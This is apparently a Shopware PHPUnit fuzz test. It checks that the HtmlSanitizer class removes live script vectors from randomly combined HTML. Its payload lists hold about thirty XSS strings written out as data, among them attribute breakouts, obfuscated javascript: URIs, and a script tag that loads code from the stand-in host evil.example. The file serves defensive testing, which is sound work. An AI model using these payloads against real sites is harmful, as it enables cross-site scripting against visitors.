<?php declare(strict_types=1);

namespace Shopware\Tests\Fuzz\Core\Framework\Util;

use Eris\Generator;
use Eris\Generators;
use Eris\TestTrait;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\TestCase;
use Shopware\Core\Framework\Log\Package;
use Shopware\Core\Framework\Util\HtmlSanitizer;

/**
 * Fuzzes HtmlSanitizer with a corpus of known XSS attack shapes (OWASP XSS Filter Evasion
 * Cheat Sheet-style: raw <script>, event-handler attributes, javascript: URIs, mixed case,
 * broken-up/nested tags, HTML-entity-encoded schemes) combined in random sequences with benign
 * markup, and asserts the sanitizer's core security promise: whatever the input, the output
 * never contains a live script vector. See .agents/skills/shopware-fuzz-tests for the pattern.
 *
 * The sets/fields configuration below mirrors the real "basic" set shipped in
 * src/Core/Framework/Resources/config/packages/shopware.yaml (html_sanitizer.sets), so this
 * exercises the same allow-list product/CMS content is actually sanitized with.
 *
 * @internal
 *
 * @phpstan-import-type SetsArray from HtmlSanitizer
 */
#[Package('framework')]
#[CoversClass(HtmlSanitizer::class)]
class HtmlSanitizerFuzzTest extends TestCase
{
    use TestTrait;

    public function testNeverOutputsALiveScriptVector(): void
    {
        $sanitizer = new HtmlSanitizer(cacheEnabled: false, sets: $this->sets());

        $this->forAll($this->htmlGenerator())
            ->then(function (string $html) use ($sanitizer): void {
                $this->assertNoLiveScriptVector($html, $sanitizer->sanitize($html));
            });
    }

    /**
     * A plain regex over the raw output string can't tell "on\w+=" sitting inert in text
     * content (harmless) from an actual live attribute on a parsed element (exploitable), so
     * this parses the output and inspects real attribute/element nodes instead.
     */
    private function assertNoLiveScriptVector(string $input, string $output): void
    {
        $previousUseErrors = libxml_use_internal_errors(true);

        try {
            $document = new \DOMDocument();
            $document->loadHTML(
                '<!DOCTYPE html><html><body>' . $output . '</body></html>',
                \LIBXML_NOERROR | \LIBXML_NOWARNING
            );
        } finally {
            libxml_use_internal_errors($previousUseErrors);
        }

        static::assertSame(
            0,
            $document->getElementsByTagName('script')->length,
            \sprintf('Input %s produced a live <script> element: %s', \var_export($input, true), $output)
        );

        foreach ($document->getElementsByTagName('*') as $element) {
            $attributes = $element->attributes;

            for ($i = 0; $i < $attributes->length; ++$i) {
                $attribute = $attributes->item($i);
                if (!$attribute instanceof \DOMAttr) {
                    continue;
                }

                static::assertDoesNotMatchRegularExpression(
                    '/^on\w+$/i',
                    $attribute->name,
                    \sprintf('Input %s produced a live event-handler attribute "%s" on <%s>: %s', \var_export($input, true), $attribute->name, $element->tagName, $output)
                );

                static::assertDoesNotMatchRegularExpression(
                    '/javascript\s*:/i',
                    $attribute->value,
                    \sprintf('Input %s produced a live javascript: URI in "%s" on <%s>: %s', \var_export($input, true), $attribute->name, $element->tagName, $output)
                );
            }
        }
    }

    /**
     * @phpstan-ignore missingType.generics (Eris's Generator only declares a Psalm template, not a PHPStan-compatible one)
     */
    private function htmlGenerator(): Generator
    {
        $fragment = Generators::oneOf(
            Generators::elements(...$this->xssPayloads()),
            Generators::elements(...$this->benignFragments()),
            $this->attributeBreakoutFragment()
        );

        return Generators::map(
            static fn (array $fragments): string => implode('', $fragments),
            Generators::vector(3, $fragment)
        );
    }

    /**
     * Places a breakout payload where it's actually dangerous: inside an existing element's
     * attribute value, trying to close the quote/tag early and inject a live attribute,
     * element, or javascript: URI - rather than as inert top-level text.
     *
     * @phpstan-ignore missingType.generics (Eris's Generator only declares a Psalm template, not a PHPStan-compatible one)
     */
    private function attributeBreakoutFragment(): Generator
    {
        return Generators::oneOf(
            Generators::map(
                static fn (string $payload): string => '<div title="' . $payload . '">x</div>',
                Generators::elements(...$this->titleBreakoutPayloads())
            ),
            Generators::map(
                static fn (string $payload): string => '<a href="' . $payload . '">link</a>',
                Generators::elements(...$this->hrefBreakoutPayloads())
            )
        );
    }

    /**
     * @return list<string>
     */
    private function titleBreakoutPayloads(): array
    {
        return [
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)',
            '"><script>alert(1)</script>',
            '\' onmouseover=\'alert(1)',
            '"><img src=x onerror=alert(1)>',
        ];
    }

    /**
     * @return list<string>
     */
    private function hrefBreakoutPayloads(): array
    {
        return [
            'javascript:alert(1)',
            ' javascript:alert(1)',
            "java\tscript:alert(1)",
            '&#106;avascript:alert(1)',
            '"><script>alert(1)</script>',
        ];
    }

    /**
     * @return list<string>
     */
    private function xssPayloads(): array
    {
        return [
            '<script>alert(1)</script>',
            '<script src="//evil.example/x.js"></script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=alert(1)>',
            '<img src="javascript:alert(1)">',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<a href="javascript:alert(1)">click</a>',
            '<a href=" javascript:alert(1)">click</a>',
            "<a href=\"java\tscript:alert(1)\">click</a>",
            '<a href="&#106;avascript:alert(1)">click</a>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<ScRiPt>alert(1)</sCriPt>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '\' onmouseover=\'alert(1)',
            '<div onclick="alert(1)">click</div>',
            '<style>body{background:url("javascript:alert(1)")}</style>',
            '<object data="javascript:alert(1)"></object>',
        ];
    }

    /**
     * @return list<string>
     */
    private function benignFragments(): array
    {
        return [
            'hello world',
            '<b>bold</b>',
            '<a href="https://example.com">link</a>',
            '<div class="foo">text</div>',
            '<p>paragraph</p>',
            '<img src="https://example.com/image.png" alt="a product">',
            '',
        ];
    }

    /**
     * Mirrors html_sanitizer.sets.basic in
     * src/Core/Framework/Resources/config/packages/shopware.yaml.
     *
     * @return SetsArray
     */
    private function sets(): array
    {
        return [
            'basic' => [
                'tags' => ['a', 'abbr', 'acronym', 'address', 'b', 'bdo', 'big', 'blockquote', 'br', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'dd', 'del', 'dfn', 'dir', 'div', 'dl', 'dt', 'em', 'font', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'ins', 'kbd', 'li', 'menu', 'ol', 'p', 'pre', 'q', 's', 'samp', 'small', 'span', 'strike', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead', 'tr', 'tt', 'u', 'ul', 'var', 'img'],
                'attributes' => ['align', 'bgcolor', 'border', 'cellpadding', 'cellspacing', 'cite', 'class', 'clear', 'color', 'colspan', 'dir', 'face', 'frame', 'height', 'href', 'id', 'lang', 'name', 'noshade', 'nowrap', 'rel', 'rev', 'rowspan', 'scope', 'size', 'span', 'start', 'style', 'summary', 'title', 'type', 'valign', 'value', 'width', 'target', 'src', 'alt'],
                'options' => [
                    'Attr.AllowedFrameTargets' => ['values' => ['_blank', '_self', '_parent', '_top']],
                    'Attr.AllowedRel' => ['values' => ['nofollow', 'print']],
                    'Attr.EnableID' => true,
                ],
            ],
        ];
    }
}
